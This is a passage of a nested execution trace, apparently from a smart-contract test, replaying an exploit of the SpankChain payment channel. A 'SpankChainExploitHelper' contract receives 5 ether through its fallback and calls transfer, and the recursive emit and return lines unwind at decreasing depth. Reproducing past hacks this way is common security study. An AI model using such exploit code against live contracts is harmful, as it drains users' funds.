    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [641] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004563918244f40000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
